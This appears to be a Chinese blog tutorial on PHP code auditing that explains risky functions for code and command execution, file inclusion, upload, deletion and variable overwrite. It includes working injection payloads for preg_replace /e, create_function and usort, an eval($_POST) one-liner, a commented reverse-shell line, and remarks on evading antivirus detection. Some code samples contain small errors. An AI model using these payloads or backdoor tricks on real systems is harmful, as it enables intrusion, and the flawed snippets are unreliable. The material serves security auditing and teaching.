---
title:  PHP代码审计基础知识
---

# PHP代码审计基础知识

## 前言

本文章主要是PHP代码审计的一些基础知识，包括函数的用法，漏洞点，偏向基础部分，个人能力有限，部分可能会出现错误或者遗漏，读者可自行补充。

## 代码执行

代码执行是代码审计当中较为严重的漏洞，主要是一些命令执行函数的不适当使用。那么，常见的能够触发这类漏洞的函数有哪些呢？

### eval()

想必大家对`eval()`函数应该并不陌生，简而言之`eval()`函数就是将传入的字符串当作 `PHP` 代码来进行执行。

```php
eval( string $code) : mixed
```

#### 返回值

`eval()` 返回 `NULL`，除非在执行的代码中 return了一个值，函数返回传递给 return的值。PHP7开始，执行的代码里如果有一个parse error，`eval()` 会抛出 ParseError 异常。在 PHP 7 之前，如果在执行的代码中有 parse error，`eval()` 返回`FALSE`，之后的代码将正常执行。无法使用`set_error_handler()`捕获 `eval()` 中的解析错误。 

也就是说，我们在利用`eval()`函数的时候，如果我们传入的字符串不是正常的代码格式，那么就会抛出异常。所以PHP7和PHP5在这部分最大的不同是什么呢？简而言之，PHP5在代码错误格式错误之后仍会执行，而PHP7在代码发生错误之后，那么`eval()`函数就会抛出异常，而不执行之后的代码。

示例：

```php
<?php
    $code = "echo 'This is a PHP7';";
    eval($code);
?>

执行结果——>This is a PHP7
```

那么如果我要执行系统命令呢？这个时候就需要用到PHP中的`system`函数。

```php
<?php
    $code = "system('whoami');";
    eval($code);
?>

执行结果——>desktop-m61j5j6\admin
```

那么到此，我们就可以结合其他姿势通过这个函数实现任意代码执行了。

### assert()

PHP 5

```php
assert( mixed $assertion[, string $description] ) : bool
```

PHP 7

```php
assert( mixed $assertion[, Throwable $exception] ) : bool
```

#### 参数

- **assertion**

断言。在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。

- **description**

如果`assertion`失败了，选项`description`将会包含在失败信息里。

- **exception**

在PHP 7中，第二个参数可以是一个`Throwable`对象，而不是一个字符串，如果断言失败且启用了`assert.exception`，那么该对象将被抛出

#### assert()配置

| 配置项           | 默认值 | 可选值                                                       |
| ---------------- | ------ | :----------------------------------------------------------- |
| zend.assertions  | 1      | 1 - 生成和执行代码(开发模式)                                                                                              0 - 生成代码，但在执行时跳过它                                                                                      -1 - 不生成代码(生产环境) |
| assert.exception | 0      | 1 - 断言失败时抛出，可以抛出异常对象，如果没有提供异常，则抛出AssertionError对象实例                                                                                                0 - 使用或生成Throwable，仅仅是基于对象生成的警告而不是抛出对象(与PHP 5 兼容) |

所以搞了这么多，`assert()`函数到底是干什么的呢？用我的理解来说，`assert()`函数是处理异常的一种形式，相当于一个if条件语句的宏定义一样。

一个PHP 7 中的示例

```php
<?php
    assert_options(ASSERT_EXCEPTION, 1);    // 设置在断言失败时产生异常
    try {
        assert(1 == 2, new AssertionError('因为1不等于2，所以前面断言失败，抛出异常'));  // 用 AssertionError 异常替代普通字符串
    } catch (Throwable $error) {
        echo $error->getMessage();
    }
?>
    
    
执行结果——>因为1不等于2，所以前面断言失败，抛出异常
```

这里就是实例化一个对象，用这个对象来抛出异常。

一个php 5 中的示例

```php
<?php
	assert(1 == 2,'前面断言失败，抛出异常');
?>
    
执行结果——>Warning: assert(): 前面断言失败，抛出异常 failed in D:\phpstudy_pro\WWW\1.php on line 2
    
<?php
	assert(1 == 2);
?>
    
执行结果——>Warning: assert(): Assertion failed in D:\phpstudy_pro\WWW\1.php on line 2
```

所以PHP 7 相较于PHP 5 就是多了个用Throwable来发出警告。

那么，如果前面断言成功呢？会发生什么呢?来个最简单，也是我们比较喜欢的示例

```php
<?php
	$code = "system(whoami)"
	assert($code);
?>
    
执行结果——>desktop-m61j5j6\admin
```

这段代码在PHP 5 和PHP 7 中都会返回命令执行结果，虽然PHP 7 中对断言函数的参数稍作了改变，但是为了兼容低版本，所以还是会直接返回结果。

### preg_replace()

通过函数名字我们也应该能够了解函数大概作用，此函数执行一个正则表达式的搜索和替换。

```php
mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

#### 参数说明：

- $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
- $replacement: 用于替换的字符串或字符串数组。
- $subject: 要搜索替换的目标字符串或字符串数组。
- $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。
- $count: 可选，为替换执行的次数。

那这个函数跟我们命令执行有什么关系呢？仅仅看上面的官方解释似乎看不出什么，但是`preg_repace()`有一个模式是/e模式，这个模式就会发生代码执行的问题，为什么呢？

看一个案例

```php
<?php
     function Ameng($regex, $value){
        return preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
    }
    foreach ($_GET as $regex => $value){
        echo Ameng($regex, $value) . "\n";
    }
?>
```

上面这段我们需要注意的就是\1,\1在正则表达式是反向引用的意思，简而言之就是指定一个子匹配项。

针对上面案例，我们来个payload：

```php
payload=/?.*={${phpinfo()}}
所以语句就成了这样
preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
```

那么我们直接把这段代码放到页面

```php
<?php
    preg_replace('/(.*)/ei', 'strtolower("\\1")', '{${phpinfo()}}');
?>
```

访问页面，结果如下：

![](/images/20200818234802.png)

我们看到成功执行了代码。

但是这里我是直接将这段代码写到了文件里，那么如果我们是通过GET传参得到参数，这里针对上面那个案例就需要注意一点，在通过GET传参时，`.*`会被替换为`_*`导致我们要的正则被替换了，达不到我们的效果，所以这里可用使用一些其他的正则表达式来达到目的，比如通过GET传参时我们的参数可以传入`\S*`从而达到同样目的。所以以后再遇到这个函数的时候，要留个心眼了。不过，这里要补充一点，就是`preg_replace()`函数在PHP 7 后便不再支持，使用`preg_replace_callback()`进行替换了，取消了不安全的`\e`模式。

### create_function()

 `create_function()`用来创建一个匿名函数

```php
create_function( string $args, string $code) : string
```

#### 参数

- string $args	声明的函数变量部分
- string $code	要执行的代码	

#### 返回值

返回唯一的函数名称作为字符串或者返回FALSE错误

`create_function()`函数在内部执行`eval()`函数，所以我们就可以利用这一点，来执行代码。当然正因为存在安全问题，所以在PHP 7.2 之后的版本中已经废弃了`create_function()`函数，使用匿名函数来代替。所以这里为了演示这个函数，我采用的是PHP 5 的环境。那么这个函数到底怎么用呢？

那么来看我写的一个简单的案例

```php
<?php
    $onefunc = create_function('$a','return system($a);');
	$onefunc(whoami);
?>
    
执行结果——>desktop-m61j5j6\admin
```

我们看到使用此函数为我们相当于创造了一个匿名的函数，给它赋以相应的变量，就执行了我们要执行的代码。

那么接下来我们来看一个简单的案例

```php
<?php
	error_reporting(0);
	$sort_by = $_GET['sort_by'];
	$sorter = 'strnatcasecmp';
	$databases=array('1234','4321');
	$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
	usort($databases, create_function('$a, $b', $sort_function));
?>
```

这个主要功能就是实现排序，这段代码就调用了`create_function()`函数，那么我们能否利用这个函数执行我们想要执行的代码呢？

当然可以，我们只需要在传参时将前面的符号闭合，然后输入我们想要执行的代码即可。

```php
payload='"]);}phpinfo();/*
执行payload前：$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
执行payloda后：$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by '"]);}phpinfo();/*
```

看到这里，你可能会有稍微疑惑，就是你闭合就闭合吧，为什么后面多了个`;}`，不知道你是否想到了这一点？

那么我就来分析一下这个，上面的那段执行代码，实际上就是一个匿名函数的创建，既然是一个函数，注意是一个函数，那么你觉得有没有花括号呢？看我如下代码

```php
<?php
    //未闭合之前
    function sort($a,$b){
    ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
	}
	//闭合之后
	function sort($a,$b){
        ' return 1 * ' . $sorter . '($a["' . $sort_by '"]);
    }
        phpinfo();/*
    }
?>
```

可以看到，我们借用了匿名函数的位置，插入了我们要执行的代码，然后等这个匿名函数被`create_function`当作`$code`执行的时候，是不是代码就被执行了。

结果：

![](/images/20200819181726.png)

那么`creat_function`函数还有别的用法吗？我们将上面一个案例简单的修改一下，代码如下：

```php
<?php
    $onefunc = create_function("","die(`cat flag.php`)");
	$_GET['func_name']();
	die();
?>
```

代码简单的来看，我们只需要执行`$onefunc`就能得到flag，但是我们不知道这个函数的名称。如果在不知道函数名称的情况下执行函数呢？这里就用到了`creat_function`函数的一个漏洞。这个函数在creat之后会自动生成一个函数名为`%00lambda_%d`的匿名函数。`%d`的值是一直递增的，会一直递增到最大长度直到结束。所以这里可以通过多进程或者多线程访问，从而看到flag。

所以，以后再代码中如果看到调用`create_function()`要小心一点，但是如果是CTF题目的话，不会这么直接就吧这个函数暴露给你，它可能会用到拼接或者替换来构造这个函数。最后再强调一下，`create_function`函数在PHP 7.2 版本之后就已经被废弃了。

### array_map()

`array_map()`为数组的每个元素应用回调函数

```php
array_map( callable $callback, array $array1[, array $...] ) : array
```

**array_map()**：返回数组，是为 `array1` 每个元素应用 `callback`函数之后的数组。`callback` 函数形参的数量和传给`array_map()` 数组数量，两者必须一样。

#### 参数

- callback：回调函数，应用到每个数组里的每个元素。
- array1：数组，遍历运行`callback`函数。
- ...：数组列表，每个都遍历运行`callback`函数。

#### 返回值

返回数组，包含`callback`函数处理之后`array1`的所有元素。

说了这么多官方的函数解释，那么这个函数到底如何使用呢？简而言之，这个函数的作用可以这么直白的解释一下。你本来有一个数组，然后我通过`array_map`函数将你这个数组当作参数传入，然后返回一个新的数组。见下图。

![](/images/20200819211747.png)

代码示例：

```php
<?php
    $old_array = array(1, 2, 3, 4, 5);
    function func($arg){
        return $arg * $arg;
    }
    $new_array = array_map('func',$old_array);
    var_dump($new_array);
?>
    
    
执行结果——>
array(5) {
  [0]=>
  int(1)
  [1]=>
  int(4)
  [2]=>
  int(9)
  [3]=>
  int(16)
  [4]=>
  int(25)
}
```

通过上述代码，我们大概知道这个函数就是调用回调函数（用户自定义的函数）来实现对现有数组的操作，从而得到一个新的数组。

那么功能我知道了，可是这个和代码执行有什么关系呢？如何能够利用这个函数执行代码呢？且看下面所示代码。

```php
<?php
    $func = 'system';
    $cmd = 'whoami';
    $old_array[0] = $cmd;
    $new_array = array_map($func,$old_array);
    var_dump($new_array);
?>
    
    
执行结果——>
desktop-m61j5j6\admin
array(1) {
  [0]=>
  string(21) "desktop-m61j5j6\admin"
}
```

这段代码就是，通过`array_map()`这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是`system`函数，那么就相当于我们用`system`函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。

### call_user_func()

`call_user_func()`是把第一个参数作为回调函数调用

```php
call_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed
```

#### 参数

第一个参数`callback`是被调用的回调函数，其余参数是回调函数的参数。

- callback：即将被调用的回调函数
- parameter：传入回调函数的参数

这个函数还是非常好理解的，看一段简单的示例代码

```php
<?php
    function callback($a,$b){
        echo $a . "\n";
        echo $b;
    }
    call_user_func('callback','我是参数1','我是参数2');
?>


执行结果——>
我是参数1
我是参数2
```

可以看到此函数作用就是调用了笔者自定义的函数。那么这个如何实现代码执行呢？好说，你在前面自定义的函数中加入能执行命令的代码不久可以代码执行了。

示例代码：

```php
<?php
    function callback($a){
        return system($a);
    }
    $cmd = 'whoami';
    call_user_func('callback',$cmd);
?>

执行结果——>
desktop-m61j5j6\admin
```



### call_user_func_array()

这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数

```php
call_user_func_array( callable $callback, array $param_arr) : mixed
```

#### 参数

- callback：被调用的回调函数
- param_arr：要被传入回调函数的数组，这个数组需要是索引数组

示例代码

```php
<?php
    function callback($a,$b){
        echo $a . "\n";
        echo $b;
    }
	$onearray = array('我是参数1','我是参数2');
    call_user_func_array('callback',$onearray);
?>


执行结果——>
我是参数1
我是参数2
```

示例代码：

```php
<?php
    function callback($a){
        return system($a);
    }
    $cmd = array('whoami');
    call_user_func_array('callback',$cmd);
?>
    
执行结果——>
desktop-m61j5j6\admin
```

### array_filter()

用回调函数过滤数数组中的单元

```php
array_filter( array $array[, callable $callback[, int $flag = 0]] ) : array
```

依次将`array`数组中的每个值传到`callback`函数。如果`callback`函数返回`true`，则`array`数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。

#### 参数

- array：要循环的数组
- callback：使用的回调函数。如果没有提供`callback`函数，将删除`array`中所有等值为FALSE的条目。
- flag：决定`callback`接收的参数形式

代码示例（这里看官方的就行，很详细）：

```php
<?php
function odd($var)
{
    // returns whether the input integer is odd
    return($var & 1);
}

function even($var)
{
    // returns whether the input integer is even
    return(!($var & 1));
}

$array1 = array("a"=>1, "b"=>2, "c"=>3, "d"=>4, "e"=>5);
$array2 = array(6, 7, 8, 9, 10, 11, 12);

echo "Odd :\n";
print_r(array_filter($array1, "odd"));
echo "Even:\n";
print_r(array_filter($array2, "even"));
?> 
    
    
执行结果——>
Odd :
Array
(
    [a] => 1
    [c] => 3
    [e] => 5
)
Even:
Array
(
    [0] => 6
    [2] => 8
    [4] => 10
    [6] => 12
)
```

从上面代码我们知道，这个函数作用其实就是过滤，只不过这个过滤调用的是函数，而被过滤的是传入的参数。到这里你心里有没有代码执行的雏形了？

代码示例：

```php
<?php
    $cmd='whoami';
    $array1=array($cmd);
    $func ='system';
    array_filter($array1,$func);
?>
    
    
执行结果——>
desktop-m61j5j6\admin
```

### usort()

使用用户自定义的比较函数对数组中的值进行排序

```php
usort( array &$array, callable $value_compare_func) : bool
```

#### 参数

- array：输入的数组
- cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数

代码示例：

```php
<?php
    function func($a,$b){
        return ($a<$b)?1:-1;
    }
    $onearray=array(1,3,2,5,9);
    usort($onearray, 'func');
    print_r($onearray);
?>

执行结果——>
Array
(
    [0] => 9
    [1] => 5
    [2] => 3
    [3] => 2
    [4] => 1
)
```

可见实现了逆序的功能。那么倘若我们把回调函数设计成能够执行代码的函数，是不是就可以执行我们想要的代码了呢？

代码示例：

```php
<?php 
    usort(...$_GET);
?>

payload: 1.php?1[0]=0&1[1]=eval($_POST['x'])&2=assert
POST传参: x=phpinfo();
```

`usort`的参数通过GET传参，第一个参数也就是`$_GET[0]`，随便传入一个数字即可。第二个参数也就是`$_GET[1]`是我们要调用的函数名称，这里采用的是`assert`函数。

执行结果：

![](/images/20200819235236.png)

### uasort()

这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。

```php
uasort( array &$array, callable $value_compare_func) : bool
```

#### 参数

- array：输入的数组
- value_compare_func：用户自定义的函数

这里用的仍然官方例子（比较好理解）

```php
<?php
// Comparison function
function cmp($a, $b) {
    if ($a == $b) {
        return 0;
    }
    return ($a < $b) ? -1 : 1;
}

// Array to be sorted
$array = array('a' => 4, 'b' => 8, 'c' => -1, 'd' => -9, 'e' => 2, 'f' => 5, 'g' => 3, 'h' => -4);
print_r($array);

// Sort and print the resulting array
uasort($array, 'cmp');
print
?>
       
执行结果——>
Array
(
    [a] => 4
    [b] => 8
    [c] => -1
    [d] => -9
    [e] => 2
    [f] => 5
    [g] => 3
    [h] => -4
)
Array
(
    [d] => -9
    [h] => -4
    [c] => -1
    [e] => 2
    [g] => 3
    [a] => 4
    [f] => 5
    [b] => 8
)
```

我们发现，在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。

代码示例：

```php
<?php
	$a = $_GET['a'];
	$onearray = array('Ameng', $_POST['x']);
	uasort($onearray, $a);
?>
```

执行结果：

![](/images/20200820001152.png)

### 总结

看完这里不知道你对代码审计中的代码执行部分是否有另一种想法？我的想法就是这个是和后门联系在一起的。我们可以看到很多函数都具有构造执行命令的条件，而且其中很多函数也的确被用在后门中，特别像后面几个回调函数，在后门中更是常见。当然这些后门函数也早已被安全厂商盯住，所以大部分已经无法直接免杀，所以想要免杀就需要结合其他姿势，比如替换、拼接、加密等等。但是这些知识在CTF中还是比较容易出现的。

## 命令执行

说完代码执行，我们再来看看命令执行。常见的命令执行函数有哪些呢？

### system()

这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出

```php
system( string $command[, int &$return_var] ) : string
```

#### 参数

- command：必需。要执行的命令
- return_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中

示例代码：

```php
<?php
    $cmd = 'whoami';
    system($cmd);
?>
    
执行结果——>
desktop-m61j5j6\admin
```

### exec()

这个其实和上面`system`函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。

```php
exec( string $command[, array &$output[, int &$return_var]] ) : string
```

#### 参数

- command：必需。要执行的命令
- output：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。
- return_var：可选。命令执行的返回状态。

```php
<?php
$cmd = 'whoami';
echo exec($cmd);
?>

执行结果——>
desktop-m61j5j6\admin
```

### shell_exec()

此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回`NULL`

```php
shell_exec( string $cmd) : string
```

#### 参数

- cmd：要执行的命令

代码示例：

```php
<?php
$cmd = 'whoami';
echo shell_exec($cmd);
?>
    
执行结果——>
desktop-m61j5j6\admin
```

### passthru()

执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代`exec()`或`system()`函数

```php
passthru( string $command[, int &$return_var] ) : void
```

#### 参数

- command：要执行的命令
- return_var：Unix命令的返回状态将被记录到此函数。

代码示例：

```php
第一你可以这么写
<?php
    passthru('whoami');	//直接将结果返回到页面
?>
第二你可以这么写
<?php
    passthru('whoami',$result);	//将结果返回到一个变量，然后通过输出变量值得到输出内容
    echo $result;
?>
```

### pcntl_exec()

在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。

```php
pcntl_exec( string $path[, array $args[, array $envs]] ) : void
```

#### 参数

- path：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!/usr/local/bin/perl的perl脚本)
- args：此参数是一个传递给程序的参数的字符串数组
- envs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

示例代码：

```php
//father
<?php
	pcntl_exec('/usr/local/bin/php', ['2.php']);
?>

```

```php
//son
<?php
    while(true){
        echo 'ok';
    }
?>
```

### popen()

此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。

```php
popen(command,mode)
```

#### 参数

- command：要执行的命令
- mode：必需。规定连接的模式
  - r：只读
  - w：只写（打开并清空已有文件或创建一个新文件）

代码示例：

```php
<?php
	$file = popen("demo.txt","r");
	pclose($file);
?>

<?php
$file = popen("/bin/ls","r");
//some code to be executed
pclose($file);
?>
```

### proc_open()

此函数执行一个命令，并且打开用来输入或者输出的文件指针

```php
proc_open( string $cmd, array $descriptorspec, array &$pipes[, string $cwd = NULL[, array $env = NULL[, array $other_options = NULL]]] ) 
```

此函数其实和`popen`函数类似，都是执行命令

#### 参数

- cmd：要执行的命令
- descriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。
- pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。
- cwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）
- env。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）
- other_options：可选。附加选项
  - suppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。 
  - bypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。 

说白了，其实就是执行命令，只不过其中多了一些选项，包括目录的，环境变量的等。

示例代码：

```php
$descriptorspec = array(
			0 => array("pipe", "r"),	//标准输入，子进程从此管道读取数据
			1 => array("pipe", "w"),	//标准输出，子进程向此管道写入数据
			2 => array("file", "/opt/figli/php/error-output.txt","a")	//标准错误，写入到指定文件
			);
 
 
	$process = proc_open("ls -a", $descriptorspec, $pipes);
 
	if(is_resource($process)){
 
		echo stream_get_contents($pipes[1]);
		fclose($pipes[1]);
 
		proc_close($process);	//在调用proc_close之前必须关闭所有管道
	}
```

## 文件包含

### include()

`include`将会包含语句并执行指定文件

```php
include 'filename';
```

关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有`include`而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。下面我来演示一下。

示例代码(1.php)：

```php
<?php
	highlight_file(__FILE__);
	$file = $_GET['file'];
	include $file;
?>
```

示例代码(2.php)：

```php
<?php
	//这里可以使用PHP来反弹shell，我这里只是演示
	//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i <&3 >&3 2>&3");
	echo '<br><h1>[*]backdoor is running!</h1>';
?>
```

执行结果：

![](/images/20200830215933.png)

### include_once()

`include_once`与`include`没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和`include_once`一样，只是增加对每个文件包含的次数。

### require()

`require`的实现和`include`功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)

其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。

`require`在出错时会导致脚本终止，而`include`在出错时只是发生警告，脚本还是继续执行。

### require_once()

这个我觉得你看完上面的，应该就懂了。这两者关系和`include`与`include_once`的关系是一样的。

### 总结

文件包含有很多利用手段，其中在实际环境中，例如我们向服务器写入了后门，但是我们无法直接连接服务器，那么如果有文件包含函数，我们可以通过文件包含函数包含执行我们的后门函数，让服务器反弹连接我们。岂不美哉。

## 文件读取(下载)

### file_get_contents()

函数功能是将整个文件读入一个字符串

```php
file_get_contents(path,include_path,context,start,max_length)
```

#### 参数

- filename：要读取文件的名称。
- include_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。
- context：可选。规定句柄的位置。
- start：可选。规定文件中开始读取的位置。
- max_length：可选。规定读取的字节数。

代码示例：

```php
<?php
    echo file_get_contents('demo.txt');
?>
    
执行结果——>
I am a demo text
```

### fopen()

此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 `@` 来隐藏错误输出。

```php
fopen(filename,mode,include_path,context)
```

#### 参数

- filename：必需。要打开的文件或URL
- mode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）
- include_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1
- context：可选。规定句柄的环境。

代码示例：

```php
<?php
	$file = fopen("demo.txt","rb");
	$content = fread($file,1024);
	echo $content;
	fclose($file);
?>
    
执行结果——>
I am a demo text
```

这段代码中其实也包含了`fread`的用法。因为`fread`仅仅只是打开一个文件，要想读取还得需要用到`fread`来读取文件内容。

### fread()

这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。

```php
string fread ( resource $handle , int $length )
```

#### 参数

- handle：文件系统指针，是典型地由 `fopen`创建的`resource`。
- length：必需。你要读取的最大字节数。

### fgets()

从打开的文件中读取一行

```php
fgets(file,length) 
```

#### 参数

- file：必需。规定要读取的文件。
- length：可选。规定要读取的字节数。默认是1024字节。

可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。

### fgetss()

这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。

```php
fgetss(file,length,tags)
```

#### 参数

- file：必需。要检查的文件。
- length：可选。规定要读取的字节数，默认1024字节。
- tags：可选。哪些标记不去掉。

代码示例：

```php
<?php
	$file = fopen("demo.html","r");
	echo fgetss($file);
	fclose($file);
?>

demo.html代码
<h1>I am a demo</h1>
    
执行结果——>
I am a demo
```

### readfile()

这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。

```php
readfile(filename,include_path,context)
```

#### 参数

- filename：必需。要读取的文件。
- include_path：可选。规定要搜索的路径。
- context：可选。规定文件句柄环境。

代码示例：

```php
<?php
	echo "<br>" . readfile("demo.txt");
?>
    
执行结果——>
I am a demo:) I am a demo:(
28
```

我们看到不仅输出了所有内容，而且还输出了总共长度。但是没有输出换行。

### file()

把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。

```php
file(path,include_path,context)
```

#### 参数

- path：必需。要读取的文件。
- include_path：可选。可指定搜索路径。
- context：可选。设置句柄环境。

代码示例：

```php
<?php
print_r(file("demo.txt"));
?>
    
执行结果——>
Array 
( 
[0] => I am the first line! 
[1] => I am the second line! 
)
```

### parse_ini_file()

从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。

```php
parse_ini_file(file,process_sections)
```

#### 参数

- file：必需。要读取的ini文件
- process_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息

代码示例：

```php
<?php
	print_r(parse_ini_file("demo.ini"));
?>

demo.ini内容：
[names]
me = Robert
you = Peter

[urls]
first = "http://www.example.com"
second = "https://www.runoob.com"

执行结果——>
Array 
( 
[me] => Robert 
[you] => Peter 
[first] => http://www.example1.com 
[second] => https://www.example2.com 
)
```

### show_source()/highlight_file()

这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，`show_source`其实就是`highlight_file`的别名。

### 总结

文件读取这块内容没什么好说的，不难，大多只是基本的应用。重点文件读取如果没有设置权限和过滤参数，那就问题大了，我们就可以任意文件读取了。

补充：什么是句柄？

开局先给一段代码

```php
$file = fopen("demo.txt","rb");
```

在这段代码中`$file`就是一个句柄。句柄关键点在“柄”，后面的`fopen`是一个资源，好比一口锅，而前面的`$file`就好比这个锅的把手。那么以后我们在操作的时候操作把手就行了。通过这个把手我们可以间接操作比较大的资源。其实也类似C语言中的指针，只是一个标识。

## 文件上传

### move_uploaded_file()

此函数是将上传的文件移动到新位置。

```php
move_uploaded_file(file,newloc)
```

#### 参数

- file：必需。规定要移动的文件。
- newloc：必需。规定文件的新位置。

本函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。

如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。

如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。

代码示例：

```php
$fileName = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.$_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'],$fileName )
```

这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。

## 文件删除

### unlink()

此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。

```php
unlink(filename,context)
```

#### 参数

- filename：必需。要删除的文件。
- context：可选。句柄环境。

我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。

代码示例：

```php
<?php
    $file = "demo.txt";
    if(unlink($file)){
        echo("$file have been deleted");
    }
	else{
        echo("$file not exist?")
    }
php>
```

### session_destroy()

在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 的机制这里我就不再过于详细介绍。

`session_destroy()`函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie 

代码示例：

```php
<?php
// 初始化会话。
// 如果要使用会话，别忘了现在就调用：
session_start();

// 重置会话中的所有变量
$_SESSION = array();

// 如果要清理的更彻底，那么同时删除会话 cookie
// 注意：这样不但销毁了会话中的数据，还同时销毁了会话本身
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}

// 最后，销毁会话
session_destroy();
?> 
```

## 变量覆盖

### extract()

此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。

```php
extract(array,extract_rules,prefix)
```

#### 参数

- array：必需。规定要使用的数组。
- extract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。
  - EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。
  - EXTR_SKIP - 如果有冲突，不覆盖已有的变量。
  - EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。
  - EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。
  - EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。
  - EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。
